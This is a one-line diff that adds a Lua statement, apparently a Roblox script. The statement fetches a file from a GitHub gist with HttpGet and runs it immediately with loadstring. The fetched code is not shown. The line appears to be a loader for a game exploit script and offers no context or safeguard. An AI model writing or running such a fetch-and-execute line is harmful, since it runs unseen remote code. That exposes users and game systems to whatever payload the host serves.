@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/KURFA-max/8b27a72747225ec9a63c4f6d7fb0f513/raw/6b894f4aef98117e8d2dab741b8128fb5e745599/gistfile1.txt", true))()
